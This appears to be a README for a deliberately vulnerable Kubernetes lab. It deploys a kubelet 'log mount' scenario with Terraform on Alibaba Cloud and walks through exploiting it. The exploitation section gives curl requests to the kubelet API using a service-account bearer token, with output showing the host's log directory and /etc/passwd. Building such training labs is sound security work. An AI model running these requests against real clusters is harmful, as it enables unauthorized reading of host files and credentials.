# kubernetes log mount Vulnerable Environment

English | [中文](./README_CN.md)

## Description

This is a scenario used to build the kubernetes "log mount" vulnerability environment.

After building the environment with Terraform, users can read host machine's file via kubelet api through the kubelet "log mount" vulnerabilities.

## Deployment Environment

Execute the following command in the container

```shell
cd /TerraformGoat/kubernetes/kubelet/log-mount
```

Configure Alibaba Cloud Access Credentials

```shell
export ALICLOUD_ACCESS_KEY="LTAI5tFkmNGXXXXXXXXX"
export ALICLOUD_SECRET_KEY="ORBs2lulAHDXXXXXXXXX"
export ALICLOUD_REGION="cn-hongkong"
```

> You can create and view your AccessKey on the [AccessKey page](https://ram.console.aliyun.com/manage/ak) of the Alibaba Cloud console

Deploy Vulnerable Environment

```shell
terraform init
terraform apply
```

> When the terminal prompts `Enter a value:`, enter `yes`

![img](../../../images/20220622-174141.jpg)

After the environment is set up, You can see the kubelet api access address of the scenario at Outputs.

## Vulnerability Utilization

first, we should read token which is usually mounted at `/var/run/secrets/kubernetes.io/serviceaccount/token` in pod. you can find it in terraform output, like below

```shell
alicloud_instance.instance (remote-exec): *** you can run below command to read '/etc/passwd' via kubelet api ***

alicloud_instance.instance (remote-exec): curl https://:10250/logs/pods/default_busybox_558731dd-284e-4dc7-be8f-529ead48db07/busybox/0.log -H "Authorization:Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6IkVEcXNHMEUtRGl0eGJhXzNHd3ZGSXBHblRUTUFRZURmclFXdjZERjYyZ28ifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjg3ODQ5MjI0LCJpYXQiOjE2NTYzMTMyMjQsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJidXN5Ym94IiwidWlkIjoiNTU4NzMxZGQtMjg0ZS00ZGM3LWJlOGYtNTI5ZWFkNDhkYjA3In0sInNlcnZpY2VhY2NvdW50Ijp7Im5hbWUiOiJkZWZhdWx0IiwidWlkIjoiMjVjMzZlMjAtYTRiNC00ZWY3LWI5OGQtN2I3MjhlMmJiMDA3In0sIndhcm5hZnRlciI6MTY1NjMxNjgzMX0sIm5iZiI6MTY1NjMxMzIyNCwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmRlZmF1bHQ6ZGVmYXVsdCJ9.gSjGOnzlPE5ML-VpPN_RYdI83I1xne1m5MHxGY0x1u7RUW2-gSnCfq43f2tnFB11x3ZCGF8H91nNnA49rM9QKCQ63l5VlUUnpESMrn9oNTIH4g1jVy8--9Vr-hHwom9cVxNpdNY5kuK60pq-ahNVhyKCSD39NkHYocaOlgXRIMjpG7yBNoPWqPLvzdftYnhfpQ4oZdf59fSVzfO0z28J-7LKL2pfDt61UE5qJfGqc5CzO7CQfSZTTrrKGZ1EVpkA3u4CBUG_fsynUFx5-yu9VvQhqFwgw2jUGP_0C4OJ8Gx6Ib4l_bd9TrIah8neIddCyFT_DVhFsGr2ZVY0Qazmcw" -k
```

second, we need to get kubelet node's external ip address. you can find it in terraform output, like below

```shell
Outputs:

kubelet_log-mount_lab_address_link = "https://8.218.13.212:10250"
```

now, we can get any container's log via kubelet api

```shell
➜  log-mount git:(main) ✗ curl https://8.218.13.212:10250/logs/ -H "Authorization:Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6IkVEcXNHMEUtRGl0eGJhXzNHd3ZGSXBHblRUTUFRZURmclFXdjZERjYyZ28ifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjg3ODQ5MjI0LCJpYXQiOjE2NTYzMTMyMjQsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJidXN5Ym94IiwidWlkIjoiNTU4NzMxZGQtMjg0ZS00ZGM3LWJlOGYtNTI5ZWFkNDhkYjA3In0sInNlcnZpY2VhY2NvdW50Ijp7Im5hbWUiOiJkZWZhdWx0IiwidWlkIjoiMjVjMzZlMjAtYTRiNC00ZWY3LWI5OGQtN2I3MjhlMmJiMDA3In0sIndhcm5hZnRlciI6MTY1NjMxNjgzMX0sIm5iZiI6MTY1NjMxMzIyNCwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmRlZmF1bHQ6ZGVmYXVsdCJ9.gSjGOnzlPE5ML-VpPN_RYdI83I1xne1m5MHxGY0x1u7RUW2-gSnCfq43f2tnFB11x3ZCGF8H91nNnA49rM9QKCQ63l5VlUUnpESMrn9oNTIH4g1jVy8--9Vr-hHwom9cVxNpdNY5kuK60pq-ahNVhyKCSD39NkHYocaOlgXRIMjpG7yBNoPWqPLvzdftYnhfpQ4oZdf59fSVzfO0z28J-7LKL2pfDt61UE5qJfGqc5CzO7CQfSZTTrrKGZ1EVpkA3u4CBUG_fsynUFx5-yu9VvQhqFwgw2jUGP_0C4OJ8Gx6Ib4l_bd9TrIah8neIddCyFT_DVhFsGr2ZVY0Qazmcw" -k
<pre>
<a href="apt/">apt/</a>
<a href="auth.log">auth.log</a>
<a href="btmp">btmp</a>
<a href="chrony/">chrony/</a>
<a href="cloud-init.log">cloud-init.log</a>
```

we can read host's `/etc/passwd` file content through read malicious pod's log

```shell
➜  log-mount git:(main) ✗ curl https://8.218.13.212:10250/logs/pods/default_busybox_558731dd-284e-4dc7-be8f-529ead48db07/busybox/0.log -H "Authorization:Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6IkVEcXNHMEUtRGl0eGJhXzNHd3ZGSXBHblRUTUFRZURmclFXdjZERjYyZ28ifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjg3ODQ5MjI0LCJpYXQiOjE2NTYzMTMyMjQsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJidXN5Ym94IiwidWlkIjoiNTU4NzMxZGQtMjg0ZS00ZGM3LWJlOGYtNTI5ZWFkNDhkYjA3In0sInNlcnZpY2VhY2NvdW50Ijp7Im5hbWUiOiJkZWZhdWx0IiwidWlkIjoiMjVjMzZlMjAtYTRiNC00ZWY3LWI5OGQtN2I3MjhlMmJiMDA3In0sIndhcm5hZnRlciI6MTY1NjMxNjgzMX0sIm5iZiI6MTY1NjMxMzIyNCwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmRlZmF1bHQ6ZGVmYXVsdCJ9.gSjGOnzlPE5ML-VpPN_RYdI83I1xne1m5MHxGY0x1u7RUW2-gSnCfq43f2tnFB11x3ZCGF8H91nNnA49rM9QKCQ63l5VlUUnpESMrn9oNTIH4g1jVy8--9Vr-hHwom9cVxNpdNY5kuK60pq-ahNVhyKCSD39NkHYocaOlgXRIMjpG7yBNoPWqPLvzdftYnhfpQ4oZdf59fSVzfO0z28J-7LKL2pfDt61UE5qJfGqc5CzO7CQfSZTTrrKGZ1EVpkA3u4CBUG_fsynUFx5-yu9VvQhqFwgw2jUGP_0C4OJ8Gx6Ib4l_bd9TrIah8neIddCyFT_DVhFsGr2ZVY0Qazmcw" -k
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
...
```

## Destroy the environment

```shell
terraform destroy
```
